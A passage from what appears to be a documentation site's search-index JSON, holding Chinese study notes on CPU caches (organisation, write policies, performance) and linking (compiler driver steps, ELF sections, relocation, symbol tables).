<li>\u200b\u51b2\u7a81\u200b\u4e0d\u200b\u547d\u4e2d\u200b: \u200b\u7f13\u5b58\u200b\u8fd8\u200b\u6ca1\u6ee1\u200b, \u200b\u4f46\u662f\u200b\u4e0b\u200b\u4e00\u5c42\u200b\u8981\u200b\u5b58\u653e\u200b\u5230\u200b\u7684\u200b\u5757\u200b\u662f\u200b\u6709\u200b\u9650\u5236\u200b\u7684\u200b, \u200b\u800c\u200b\u8fd9\u4e9b\u200b\u5757\u200b\u6ee1\u200b\u4e86\u200b. (\u200b\u6bd4\u5982\u200b\u4e0b\u200b\u4e00\u5c42\u200b\u7f16\u53f7\u200b\u4e3a\u200b i \u200b\u7684\u200b\u5757\u200b\u53ea\u80fd\u200b\u5b58\u653e\u200b\u5230\u200b i % 4 \u200b\u7684\u200b\u5757\u200b)</li> <li>\u200b\u5bb9\u91cf\u200b\u4e0d\u200b\u547d\u4e2d\u200b: \u200b\u7f13\u5b58\u200b\u592a\u5c0f\u200b\u4e86\u200b, \u200b\u5df2\u7ecf\u200b\u6ee1\u200b\u4e86\u200b</li> </ul>"},{"location":"notes/ICS/Chapter%2006%20Cache/#64","title":"6.4 \u200b\u9ad8\u901f\u7f13\u5b58\u200b\u5b58\u50a8\u5668","text":"<p>\u200b\u7531\u4e8e\u200b CPU \u200b\u548c\u200b\u4e3b\u5b58\u200b\u4e4b\u95f4\u200b\u9010\u6e10\u200b\u589e\u5927\u200b\u7684\u200b\u5dee\u8ddd\u200b\u800c\u200b\u5728\u200b CPU \u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b\u548c\u200b\u4e3b\u5b58\u200b\u4e4b\u95f4\u200b\u63d2\u5165\u200b\u7684\u200b SRAM \u200b\u9ad8\u901f\u7f13\u5b58\u200b\u5b58\u50a8\u5668\u200b. L1, L2 \u200b\u9ad8\u901f\u7f13\u5b58\u200b, \u200b\u6709\u200b\u7684\u200b\u8fd8\u6709\u200b L3 \u200b\u9ad8\u901f\u7f13\u5b58\u200b.</p>"},{"location":"notes/ICS/Chapter%2006%20Cache/#641","title":"6.4.1 \u200b\u901a\u7528\u200b\u7684\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u5b58\u50a8\u5668\u200b\u7ec4\u7ec7\u200b\u7ed3\u6784","text":"<p>\u200b\u5047\u8bbe\u200b\u5730\u5740\u200b\u6709\u200b m \u200b\u4f4d\u200b, \u200b\u6709\u200b 2^m \u200b\u4e2a\u200b\u4e0d\u540c\u200b\u5730\u5740\u200b. - S=2^s: \u200b\u6709\u200b S \u200b\u4e2a\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u7ec4\u200b - E: \u200b\u9ad8\u901f\u7f13\u5b58\u200b\u884c\u200b - B=2^b: \u200b\u6570\u636e\u200b\u5757\u200b - 1\u200b\u4f4d\u200b\u6709\u6548\u200b\u4f4d\u200b - m-s-b\u200b\u4e2a\u200b\u6807\u8bb0\u200b\u4f4d\u200b</p> <p> \u200b\u9ad8\u901f\u7f13\u5b58\u200b\u7684\u200b\u5bb9\u91cf\u200b: S*E*B</p> <p>\u200b\u672c\u8d28\u200b\u4e0a\u200b\u5c31\u662f\u200b\u628a\u200b\u4e00\u4e9b\u200b\u8fde\u7eed\u200b\u7684\u200b\u6570\u636e\u200b(B\u200b\u5b57\u8282\u200b)\u200b\u770b\u4f5c\u200b\u4e00\u4e2a\u200b\u96c6\u5408\u200b, \u200b\u7136\u540e\u200b\u4e00\u5171\u200b\u53ef\u4ee5\u200b\u5b58\u653e\u200b S*E \u200b\u4e2a\u200b\u96c6\u5408\u200b</p> <p>\u200b\u96c6\u5408\u200b\u7528\u200b(\u200b\u6807\u8bb0\u200b\u4f4d\u200b,\u200b\u7ec4\u53f7\u200b)\u200b\u6765\u200b\u786e\u5b9a\u200b, \u200b\u5982\u679c\u200b\u6bcf\u4e2a\u200b\u7ec4\u6709\u200b\u591a\u884c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b58\u653e\u200b\u591a\u4e2a\u200b\u96c6\u5408\u200b, \u200b\u5426\u5219\u200b\u53ea\u80fd\u200b\u6bcf\u4e2a\u200b\u7ec4\u200b\u53ea\u80fd\u200b\u5b58\u653e\u200b\u4e00\u4e2a\u200b\u96c6\u5408\u200b(E=1)</p> <p>\u200b\u5feb\u901f\u200b\u786e\u5b9a\u200b\u7ec4\u53f7\u200b: (\u200b\u5730\u5740\u200b / B) % S </p> <p>\u200b\u6807\u8bb0\u200b\u4f4d\u200b: \u200b\u5730\u5740\u200b / (B * S)</p> <p>\u200b\u67e5\u627e\u200b\u901f\u5ea6\u200b: \u200b\u76f4\u63a5\u200b\u6620\u5c04\u200b&gt;\u200b\u7ec4\u200b\u76f8\u8054\u200b&gt;\u200b\u5168\u200b\u76f8\u8054\u200b (\u200b\u540e\u9762\u200b\u4e24\u4e2a\u200b\u8981\u200b\u5339\u914d\u200b\u6bcf\u200b\u4e00\u884c\u200b)</p> <p>\u200b\u547d\u4e2d\u200b\u6548\u7387\u200b: \u200b\u76f4\u63a5\u200b\u6620\u5c04\u200b&lt;\u200b\u7ec4\u200b\u76f8\u8054\u200b&lt;\u200b\u5168\u200b\u76f8\u8054\u200b (\u200b\u5168\u200b\u76f8\u8054\u200b\u6240\u6709\u200b\u4f4d\u7f6e\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u653e\u200b, \u200b\u76f4\u5230\u200b\u7f13\u5b58\u200b\u6ee1\u200b, \u200b\u76f4\u63a5\u200b\u6620\u5c04\u200b\u6709\u200b\u53ef\u80fd\u200b\u7f13\u5b58\u200b\u6ca1\u200b\u6ee1\u200b\u5c31\u8981\u200b\u9a71\u9010\u200b)</p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u5168\u200b\u76f8\u8054\u200b\u66f4\u200b\u591a\u7528\u200b\u5728\u200b\u5f88\u5c0f\u200b\u7684\u200b\u7f13\u5b58\u200b, \u200b\u5982\u200b TLB \u200b\u4e2d\u200b.</p>"},{"location":"notes/ICS/Chapter%2006%20Cache/#642","title":"6.4.2 \u200b\u9ad8\u901f\u7f13\u5b58\u200b\u7684\u200b\u5199","text":"<p>\u200b\u9996\u5148\u200b\u533a\u5206\u200b\u4e24\u79cd\u200b\u60c5\u51b5\u200b, \u200b\u5199\u200b\u547d\u4e2d\u200b\u548c\u200b\u5199\u200b\u4e0d\u200b\u547d\u4e2d\u200b. \u200b\u5199\u200b\u547d\u4e2d\u200b\u5c31\u662f\u200b\u8981\u200b\u5199\u200b\u7684\u200b\u6570\u636e\u200b\u5728\u200b\u8fd9\u200b\u4e00\u5c42\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u4e2d\u200b</p> <p>\u200b\u5199\u200b\u547d\u4e2d\u200b: \u200b\u8fd9\u65f6\u5019\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u66f4\u6539\u200b\u8fd9\u200b\u4e00\u5c42\u200b\u7684\u200b\u6570\u636e\u200b, \u200b\u7136\u540e\u200b\u8981\u200b\u601d\u8003\u200b\u600e\u4e48\u200b\u66f4\u6539\u200b\u4f4e\u200b\u4e00\u5c42\u200b\u7684\u200b\u6570\u636e\u200b. - \u200b\u76f4\u5199\u200b: \u200b\u7acb\u5373\u200b\u5c06\u200b w \u200b\u7684\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u5757\u200b\u5199\u4f1a\u200b\u5230\u200b\u7d27\u63a5\u7740\u200b\u7684\u200b\u4f4e\u200b\u4e00\u5c42\u200b, \u200b\u867d\u7136\u200b\u7b80\u5355\u200b, \u200b\u4f46\u662f\u200b\u6bcf\u6b21\u200b\u5199\u200b\u90fd\u200b\u4f1a\u200b\u5f15\u8d77\u200b\u603b\u7ebf\u200b\u6d41\u91cf\u200b. - \u200b\u5199\u56de\u200b: \u200b\u63a8\u8fdf\u200b\u66f4\u65b0\u200b, \u200b\u53ea\u6709\u200b\u5f53\u200b\u66ff\u6362\u7b97\u6cd5\u200b\u8981\u200b\u9a71\u9010\u200b\u8fd9\u4e2a\u200b\u66f4\u65b0\u200b\u8fc7\u200b\u7684\u200b\u5757\u200b\u65f6\u200b, \u200b\u624d\u200b\u628a\u200b\u5b83\u200b\u5199\u200b\u5230\u200b\u4e0b\u200b\u4e00\u5c42\u200b. (\u200b\u6709\u70b9\u200b\u7c7b\u4f3c\u200b\u7ebf\u6bb5\u200b\u6811\u200b\u7684\u200b\u61d2\u200b\u6807\u8bb0\u200b), \u200b\u7f3a\u70b9\u200b\u662f\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7ef4\u62a4\u200b\u4fee\u6539\u200b\u4f4d\u200b</p> <p>\u200b\u5199\u200b\u4e0d\u200b\u547d\u4e2d\u200b: - \u200b\u5199\u200b\u5206\u914d\u200b: \u200b\u52a0\u8f7d\u200b\u4f4e\u200b\u4e00\u5c42\u200b\u7684\u200b\u5757\u200b\u5230\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u4e2d\u200b, \u200b\u7136\u540e\u200b\u66f4\u65b0\u200b. \u200b\u5b83\u200b\u8bd5\u56fe\u200b\u5229\u7528\u200b\u5199\u200b\u7684\u200b\u7a7a\u95f4\u200b\u5c40\u90e8\u6027\u200b(\u200b\u76f8\u90bb\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u5199\u200b), \u200b\u4f46\u662f\u200b\u6bcf\u6b21\u200b\u4e0d\u200b\u547d\u4e2d\u200b\u90fd\u200b\u8981\u200b\u4f20\u9001\u200b\u4e00\u4e2a\u200b\u5757\u200b. - \u200b\u975e\u5199\u200b\u5206\u914d\u200b: \u200b\u907f\u5f00\u200b\u9ad8\u901f\u7f13\u5b58\u200b, \u200b\u76f4\u63a5\u200b\u5199\u200b\u5230\u200b\u4f4e\u200b\u4e00\u5c42\u200b\u4e2d\u200b(\u200b\u4e0d\u200b\u547d\u4e2d\u200b\u5c31\u200b\u4e0d\u200b\u547d\u4e2d\u200b\u5427\u200b, \u200b\u4e0d\u7ba1\u200b\u4e86\u200b)</p> <p>\u200b\u89c2\u5bdf\u200b\u4e00\u4e0b\u200b, \u200b\u600e\u4e48\u200b\u5224\u65ad\u200b\u67d0\u5c42\u200b\u7684\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u662f\u200b\u91c7\u7528\u200b\u54ea\u200b\u79cd\u200b\u7b56\u7565\u200b. \u200b\u9996\u5148\u200b\u5bf9\u4e8e\u200b\u6bd4\u8f83\u200b\u4f4e\u5c42\u200b\u7684\u200b\u7f13\u5b58\u200b, \u200b\u7531\u4e8e\u200b\u4f20\u9001\u200b\u65f6\u95f4\u200b\u5f88\u200b\u6162\u200b, \u200b\u6bcf\u6b21\u200b\u5199\u200b\u90fd\u200b\u8981\u82b1\u8d39\u200b\u65f6\u95f4\u200b\u5f88\u200b\u4e45\u200b, \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u4e00\u822c\u200b\u91c7\u7528\u200b\u5199\u200b\u547d\u4e2d\u200b\u65f6\u5199\u200b\u56de\u200b+\u200b\u5199\u200b\u4e0d\u200b\u547d\u4e2d\u200b\u65f6\u5199\u200b\u5206\u914d\u200b. \u200b\u53cd\u4e4b\u200b\u5bf9\u4e8e\u200b\u9ad8\u5c42\u200b\u7684\u200b\u7f13\u5b58\u200b, \u200b\u4f20\u9001\u200b\u65f6\u95f4\u200b\u6bd4\u8f83\u200b\u5feb\u200b, \u200b\u6211\u4eec\u200b\u4e00\u822c\u200b\u91c7\u7528\u200b\u5199\u200b\u547d\u4e2d\u200b\u65f6\u76f4\u200b\u5199\u200b+\u200b\u5199\u200b\u4e0d\u200b\u547d\u4e2d\u200b\u65f6\u975e\u200b\u5199\u200b\u5206\u914d\u200b. \u200b\u5f53\u7136\u200b\u8fd9\u200b\u4e5f\u200b\u4e0d\u662f\u200b\u7edd\u5bf9\u200b\u7684\u200b, \u200b\u73b0\u5728\u200b\u5199\u200b\u56de\u200b\u7684\u200b\u9ad8\u200b\u590d\u6742\u6027\u200b\u4e0d\u518d\u200b\u662f\u200b\u963b\u788d\u200b, \u200b\u56e0\u6b64\u200b\u51e0\u4e4e\u200b\u6240\u6709\u200b\u5c42\u6b21\u200b\u90fd\u200b\u80fd\u200b\u770b\u5230\u200b\u5199\u56de\u200b\u7f13\u5b58\u200b.</p> <p>\u200b\u4f46\u662f\u200b\u65e0\u8bba\u600e\u6837\u200b, \u200b\u5199\u56de\u200b+\u200b\u5199\u200b\u5206\u914d\u200b, \u200b\u76f4\u5199\u200b+\u200b\u975e\u5199\u200b\u5206\u914d\u200b\u7684\u200b\u7ec4\u5408\u200b\u4e00\u822c\u200b\u662f\u200b\u914d\u5957\u200b\u51fa\u73b0\u200b\u7684\u200b, \u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u7684\u200b\u7406\u5ff5\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b, \u200b\u4e00\u4e2a\u200b\u662f\u200b\u5229\u7528\u200b\u5c40\u90e8\u6027\u200b, \u200b\u4e00\u4e2a\u200b\u662f\u200b\u7acb\u523b\u200b\u5199\u200b\u5230\u200b\u4e0b\u200b\u4e00\u5c42\u200b.</p>"},{"location":"notes/ICS/Chapter%2006%20Cache/#643","title":"6.4.3 \u200b\u771f\u5b9e\u200b\u7684\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u5c42\u6b21\u7ed3\u6784\u200b\u89e3\u5256","text":"<p>\u200b\u53ea\u200b\u4fdd\u5b58\u200b\u6307\u4ee4\u200b\u7684\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u79f0\u4e3a\u200b i-cache, \u200b\u53ea\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u7684\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u79f0\u4e3a\u200b d-cache.</p>"},{"location":"notes/ICS/Chapter%2006%20Cache/#644","title":"6.4.4 \u200b\u9ad8\u901f\u7f13\u5b58\u200b\u6027\u80fd\u200b\u5f71\u54cd","text":"<ul> <li>\u200b\u4e0d\u200b\u547d\u4e2d\u7387\u200b: \u200b\u4e0d\u200b\u547d\u4e2d\u200b\u6570\u91cf\u200b/\u200b\u5f15\u7528\u200b\u6570\u91cf\u200b</li> <li>\u200b\u547d\u4e2d\u7387\u200b:</li> <li>\u200b\u547d\u4e2d\u200b\u65f6\u95f4\u200b:</li> <li>\u200b\u4e0d\u200b\u547d\u4e2d\u200b\u5904\u7f5a\u200b: \u200b\u4e0d\u200b\u547d\u4e2d\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b \u200b\u989d\u5916\u200b\u65f6\u95f4\u200b</li> </ul>"},{"location":"notes/ICS/Chapter%2006%20Cache/#65","title":"6.5 \u200b\u5b58\u50a8\u5668\u200b\u5c71","text":"<p>\u200b\u901a\u8fc7\u200b\u9884\u70ed\u200b\u548c\u200b\u771f\u6b63\u200b\u5faa\u73af\u200b\u4f53\u73b0\u200b\u65f6\u95f4\u200b\u5c40\u90e8\u6027\u200b(\u200b\u7a7a\u95f4\u200b\u8d8a\u5927\u200b, \u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u95f4\u9694\u200b\u5c31\u200b\u8d8a\u957f\u200b), \u200b\u901a\u8fc7\u200b\u6b65\u957f\u200b\u4f53\u73b0\u200b\u7a7a\u95f4\u200b\u5c40\u90e8\u6027\u200b</p> <p>\u200b\u5728\u200b\u6b65\u957f\u200b\u4e3a\u200b 1 \u200b\u65f6\u200b, Core i7 \u200b\u4f1a\u200b\u6709\u200b\u786c\u4ef6\u200b\u9884\u53d6\u200b\u673a\u5236\u200b\u4f18\u5316\u200b, \u200b\u5bfc\u81f4\u200b\u5de5\u4f5c\u200b\u96c6\u200b\u5373\u4f7f\u200b\u8d85\u51fa\u200b\u4e86\u200b L1, L2 Cache \u200b\u7684\u200b\u5927\u5c0f\u200b, \u200b\u4e5f\u200b\u80fd\u200b\u8fbe\u5230\u200b  12GB/s \u200b\u7684\u200b\u541e\u5410\u91cf\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/","title":"Chapter 07 Linking","text":""},{"location":"notes/ICS/Chapter%2007%20Linking/#71","title":"7.1 \u200b\u7f16\u8bd1\u5668\u200b\u9a71\u52a8\u7a0b\u5e8f","text":"<p>\u200b\u4ee5\u200b\u94fe\u63a5\u200b main.o, sum.o \u200b\u4e24\u4e2a\u200b\u6587\u4ef6\u200b\u4e3a\u4f8b\u200b Bash<pre><code>&gt; cpp [...] main.c /tmp/main.i \n&gt; ccl /tmp/main.i -Og [...] -o /tmp/main.s\n&gt; as [...] -o /tmp/main.o /tmp/main.s\n&gt; (the same procedure for sum.o)\n&gt; ld -o prog [...] /tmp/main.o /tmp/sum.o\n&gt; ./prog\n</code></pre></p> <p>cpp : \u200b\u9884\u200b\u5904\u7406\u5668\u200b, C Pre Processor (not .cpp file)</p> <p>ccl : \u200b\u7f16\u8bd1\u5668\u200b</p> <p>as : \u200b\u6c47\u7f16\u5668\u200b</p> <p>ld : \u200b\u94fe\u63a5\u200b\u5668\u200b</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#72","title":"7.2 \u200b\u9759\u6001\u200b\u94fe\u63a5","text":"<p>\u200b\u9759\u6001\u200b\u94fe\u63a5\u200b\u5668\u4ee5\u200b\u4e00\u7ec4\u200b \u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b \u200b\u548c\u200b \u200b\u547d\u4ee4\u884c\u200b\u53c2\u6570\u200b\u4f5c\u4e3a\u200b\u8f93\u5165\u200b, \u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u5b8c\u5168\u200b\u94fe\u63a5\u200b\u7684\u200b, \u200b\u53ef\u4ee5\u200b\u52a0\u8f7d\u200b\u548c\u200b\u8fd0\u884c\u200b\u7684\u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b \u200b\u4f5c\u4e3a\u200b\u8f93\u51fa\u200b.</p> <p>\u200b\u4e3a\u4e86\u200b\u6784\u9020\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b, \u200b\u94fe\u63a5\u200b\u5668\u200b\u9700\u8981\u200b\u5b8c\u6210\u200b\u4e24\u4e2a\u200b\u4e3b\u8981\u200b\u4efb\u52a1\u200b: - \u200b\u7b26\u53f7\u200b\u89e3\u6790\u200b (symbol resolution). \u200b\u5c06\u200b\u7b26\u53f7\u200b\u5f15\u7528\u200b\u4e0e\u200b\u7b26\u53f7\u200b\u5b9a\u4e49\u200b\u5173\u8054\u200b\u8d77\u6765\u200b. \u200b\u7b26\u53f7\u200b\u53ef\u4ee5\u200b\u662f\u200b\u51fd\u6570\u200b, \u200b\u5168\u5c40\u53d8\u91cf\u200b, \u200b\u6216\u200b\u9759\u6001\u200b\u53d8\u91cf\u200b (\u200b\u4ee5\u200b <code>static</code> \u200b\u5c5e\u6027\u200b\u58f0\u660e\u200b\u7684\u200b\u53d8\u91cf\u200b). - \u200b\u91cd\u200b\u5b9a\u4f4d\u200b (relocation). \u200b\u7f16\u8bd1\u5668\u200b\u548c\u200b\u6c47\u7f16\u5668\u200b\u751f\u6210\u200b\u7684\u200b\u4ee3\u7801\u200b\u548c\u200b\u6570\u636e\u200b\u8282\u200b\u5730\u5740\u200b\u90fd\u200b\u662f\u4ece\u200b 0 \u200b\u5f00\u59cb\u200b\u7684\u200b. \u200b\u94fe\u63a5\u200b\u5668\u8981\u200b\u5c06\u200b\u7b26\u53f7\u200b\u5b9a\u4e49\u200b\u4e0e\u200b\u5185\u5b58\u200b\u4f4d\u7f6e\u200b\u5173\u8054\u200b\u8d77\u6765\u200b, \u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u8fd9\u4e9b\u200b\u8282\u200b, \u200b\u4fee\u6539\u200b\u5bf9\u200b\u7b26\u53f7\u200b\u7684\u200b\u5f15\u7528\u200b\u4f7f\u5f97\u200b\u5b83\u4eec\u200b\u6307\u5411\u200b\u771f\u5b9e\u200b\u7684\u200b\u5185\u5b58\u200b\u4f4d\u7f6e\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#73","title":"7.3 \u200b\u76ee\u6807\u200b\u6587\u4ef6","text":"<p>\u200b\u4e09\u79cd\u200b\u5f62\u5f0f\u200b: - \u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b.  \u200b\u53ef\u4ee5\u200b\u548c\u200b\u522b\u7684\u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u94fe\u63a5\u200b\u5f62\u6210\u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b - \u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b. \u200b\u53ef\u200b\u88ab\u200b\u76f4\u63a5\u200b\u590d\u5236\u5230\u200b\u5185\u5b58\u200b\u5e76\u200b\u6267\u884c\u200b. - \u200b\u5171\u4eab\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b. \u200b\u7279\u6b8a\u200b\u7684\u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b, \u200b\u53ef\u200b\u5728\u200b\u52a0\u8f7d\u200b\u6216\u200b\u8fd0\u884c\u200b\u65f6\u200b\u88ab\u200b\u52a8\u6001\u200b\u5730\u200b\u52a0\u8f7d\u200b\u8fdb\u200b\u5185\u5b58\u200b\u5e76\u200b\u94fe\u63a5\u200b.</p> <p>\u200b\u5404\u4e2a\u7cfb\u7edf\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u7684\u200b\u683c\u5f0f\u200b\u4e0d\u5c3d\u76f8\u540c\u200b. - Unix: a.out - Windows: PE - Mac OS-X: Mach-O - \u200b\u73b0\u4ee3\u200b x86-64 Linux: ELF</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#74","title":"7.4 \u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6587\u4ef6","text":"<ul> <li>ELF \u200b\u5934\u200b: 16 \u200b\u5b57\u8282\u200b\u5e8f\u5217\u200b. \u200b\u63cf\u8ff0\u200b\u6587\u4ef6\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b, \u200b\u5305\u62ec\u200b\u8282\u200b\u5934\u90e8\u200b\u8868\u200b\u7684\u200b\u6587\u4ef6\u200b\u4fbf\u5b9c\u200b, \u200b\u8282\u200b\u5934\u90e8\u200b\u8868\u4e2d\u6761\u200b\u76ee\u7684\u200b\u5927\u5c0f\u200b\u548c\u200b\u6570\u91cf\u200b. </li> <li>\u200b\u8282\u200b\u5934\u90e8\u200b\u8868\u200b: \u200b\u4e0d\u540c\u200b\u8282\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u548c\u200b\u5927\u5c0f\u200b\u7531\u8282\u200b\u5934\u90e8\u200b\u8868\u200b\u63cf\u8ff0\u200b, \u200b\u6bcf\u4e2a\u200b\u8282\u200b\u90fd\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\u7684\u200b\u6761\u76ee\u200b.</li> <li>\u200b\u5939\u200b\u5728\u200b ELF \u200b\u5934\u548c\u8282\u200b\u5934\u90e8\u200b\u8868\u200b\u7684\u200b\u90fd\u200b\u662f\u200b\u8282\u200b, \u200b\u5178\u578b\u200b\u7684\u200b ELF \u200b\u6587\u4ef6\u200b\u5305\u542b\u200b:<ul> <li>.text: \u200b\u5df2\u200b\u7f16\u8bd1\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u673a\u5668\u200b\u4ee3\u7801\u200b</li> <li>.rodata: \u200b\u53ea\u8bfb\u200b\u6570\u636e\u200b</li> <li>.data: \u200b\u5df2\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u5168\u5c40\u200b\u548c\u200b\u9759\u6001\u200b C \u200b\u53d8\u91cf\u200b</li> <li>.bss: \u200b\u672a\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u5168\u5c40\u200b\u548c\u200b\u9759\u6001\u200b C \u200b\u53d8\u91cf\u200b, \u200b\u88ab\u200b\u521d\u59cb\u5316\u200b\u4e3a\u200b 0 \u200b\u7684\u200b\u5168\u5c40\u200b\u548c\u200b\u9759\u6001\u200b C \u200b\u53d8\u91cf\u200b</li> <li>.symtab: \u200b\u7b26\u53f7\u8868\u200b</li> <li>.rel.text: \u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u6210\u200b\u4e00\u4e2a\u200b\u5f85\u529e\u200b\u4e8b\u9879\u200b, \u200b\u8bf4\u660e\u200b\u5f85\u4f1a\u200b\u8981\u200b\u5c06\u200b text \u200b\u4e2d\u200b\u7684\u200b\u4ec0\u4e48\u200b\u4f4d\u7f6e\u200b\u91cd\u200b\u5b9a\u4f4d\u200b</li> <li>.rel.data: \u200b\u7c7b\u4f3c\u200b\u7684\u200b</li> <li>.debug: \u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u8868\u200b, -g \u200b\u9009\u9879\u200b\u751f\u6210\u200b</li> <li>.line: C \u200b\u7a0b\u5e8f\u200b\u884c\u53f7\u200b\u548c\u200b .text \u200b\u4e4b\u95f4\u200b\u6620\u5c04\u200b</li> <li>.strtab: \u200b\u5b57\u7b26\u4e32\u200b\u8868\u200b.</li> </ul> </li> </ul> <p>\u200b\u533a\u5206\u200b .rel.text \u200b\u548c\u200b .rel.data \u200b\u7684\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u5185\u5bb9\u200b</p> <p>\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u5b57\u9762\u200b\u610f\u601d\u200b\u6765\u200b\u7406\u89e3\u200b. .rel.text \u200b\u5c31\u662f\u200b\u673a\u5668\u200b\u4ee3\u7801\u200b\u4e2d\u6709\u200b\u9700\u8981\u200b\u88ab\u200b\u66ff\u6362\u200b\u7684\u200b\u5185\u5bb9\u200b, .rel.data \u200b\u5c31\u662f\u200b\u5728\u200b\u7b26\u53f7\u200b\u503c\u4e2d\u200b\u6709\u200b\u9700\u8981\u200b\u88ab\u200b\u66ff\u6362\u200b\u7684\u200b\u5185\u5bb9\u200b.</p> <p>\u200b\u4f8b\u5982\u200b  C<pre><code>extern int x;\nint f() {\n   return x + 1;\n}\n</code></pre> \u200b\u8fd9\u91cc\u200b\u7684\u200b x \u200b\u662f\u200b\u5916\u90e8\u200b\u7b26\u53f7\u200b, \u200b\u5728\u200b\u673a\u5668\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u6211\u4eec\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b\u8fd9\u6837\u200b\u7684\u200b\u5185\u5bb9\u200b Text Only<pre><code>4: 8b 05 00 00 00 00 mov 0x0(%rip),%eax\n</code></pre> \u200b\u94fe\u63a5\u200b\u5c31\u662f\u200b\u628a\u200b 00 00 00 00 \u200b\u7684\u200b\u5360\u4f4d\u200b\u7b26\u200b\u66ff\u6362\u6210\u200b\u771f\u5b9e\u200b\u5730\u5740\u200b(\u200b\u8fd9\u91cc\u200b\u4f7f\u7528\u200b %rip PC \u200b\u76f8\u5bf9\u200b\u5bfb\u5740\u200b)</p> <p>\u200b\u5982\u679c\u200b\u662f\u200b C<pre><code>extern int x;\nint p = x;\n</code></pre> \u200b\u8fd9\u91cc\u200b\u7531\u4e8e\u200b\u7f16\u8bd1\u200b\u7684\u200b\u65f6\u5019\u200b\u6211\u4eec\u200b\u4e0d\u200b\u77e5\u9053\u200b x \u200b\u7684\u200b\u503c\u200b, \u200b\u6240\u4ee5\u200b .data \u200b\u8282\u4e2d\u200b\u7684\u200b p \u200b\u7684\u200b\u503c\u200b\u662f\u200b 00000000, \u200b\u7b49\u5230\u200b\u94fe\u63a5\u200b\u7684\u200b\u65f6\u5019\u200b\u6211\u4eec\u200b\u518d\u200b\u5c06\u200b\u771f\u5b9e\u200b\u7684\u200b\u503c\u200b\u66ff\u6362\u200b, \u200b\u6240\u4ee5\u200b\u662f\u200b\u901a\u8fc7\u200b .rel.data </p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#75","title":"7.5 \u200b\u7b26\u53f7\u200b\u548c\u200b\u7b26\u53f7\u8868","text":"<p>\u200b\u6bcf\u4e2a\u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b m \u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7b26\u53f7\u8868\u200b, \u200b\u5305\u542b\u200b m \u200b\u5b9a\u4e49\u200b\u548c\u200b\u5f15\u7528\u200b\u7684\u200b\u7b26\u53f7\u200b\u4fe1\u606f\u200b, \u200b\u6709\u200b\u4e09\u79cd\u200b\u4e0d\u540c\u200b\u7684\u200b\u7b26\u53f7\u200b. - \u200b\u7531\u200b m \u200b\u5b9a\u4e49\u200b\u5e76\u200b\u80fd\u200b\u88ab\u200b\u5176\u4ed6\u200b\u6a21\u5757\u200b\u5f15\u7528\u200b\u7684\u200b \u200b\u5168\u5c40\u200b\u7b26\u53f7\u200b, \u200b\u5bf9\u5e94\u200b\u975e\u200b\u9759\u6001\u200b\u7684\u200b C \u200b\u51fd\u6570\u200b\u548c\u200b\u5168\u5c40\u53d8\u91cf\u200b - \u200b\u7531\u200b\u5176\u4ed6\u200b\u6a21\u5757\u200b\u5b9a\u4e49\u200b\u5e76\u200b\u88ab\u200b m 